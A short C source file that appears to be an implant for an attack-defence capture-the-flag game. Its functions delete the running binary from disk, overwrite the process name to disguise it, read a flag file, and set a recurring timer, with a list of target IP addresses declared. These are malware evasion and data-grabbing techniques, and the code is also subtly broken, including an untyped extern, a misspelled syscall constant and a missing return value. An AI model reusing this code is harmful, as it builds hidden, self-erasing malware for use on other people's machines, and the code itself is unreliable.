#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/time.h>

#include "global_var.h"

extern ip_addr[170];

void delete_self() {
  unsigned char file[100] = {0};
  int pathlen = syscall(_NR_readlink, "/proc/self/exe", file, 99);
  remove(file);
  return;
}

void change_name(int argc, char **argv) {
  memset(argv[0], 0, strlen(argv[0]));
  strcpy(argv[0], CHANGE_NAME);
  memset(argv[1], 0, strlen(argv[1]));
  return;
}


int get_flag(char* out_flag){

  unsigned int f;
  int l;
  f = open(FLAG_FILE_PATH, 0);
  if (f > 0){
    l = read(f, out_flag, 0x7f);
  }
  else
    return;
  close(f);
  return l;
}

void set_timer(){
  static struct itimerval it; 
  it.it_value.tv_sec = (INTERVAL / 1000);
  it.it_value.tv_usec = (INTERVAL % 1000) * 1000;

  setitimer(ITIMER_REAL, &it, NULL);
}

